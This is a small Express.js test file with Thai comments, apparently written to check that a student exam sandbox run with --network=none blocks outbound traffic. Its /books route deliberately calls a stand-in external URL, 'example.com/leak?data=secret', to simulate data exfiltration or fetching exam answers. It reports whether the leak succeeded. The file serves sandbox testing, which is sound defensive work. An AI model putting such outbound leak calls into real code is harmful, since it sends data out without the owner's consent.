// กรณีเผื่อที่เวลา นศ. จะแอบต่อเน็ตออกนอก
// พยายามส่งข้อมูลออกไปเซิร์ฟเวอร์ภายนอก (จำลองการขโมยข้อมูล/โกงข้อสอบ)
// ทดสอบตัวบรรทัด --network=none (ต้องต่อเน็ตไม่ได้เลย)
const express = require('express');
const app = express();
 
app.get('/books', async (req, res) => {
  try {
    // พยายามยิงออกเน็ต ปล. สมมุติเอาเฉลยจากข้างนอก
    const r = await fetch('https://example.com/leak?data=secret');
    res.json({ leaked: true, status: r.status });
  } catch (err) {
    // ถ้า sandbox ทำงานถูก จะเข้า catch นี้เสมอ
    res.status(500).json({ error: 'network blocked', detail: err.message });
  }
});
 
module.exports = app;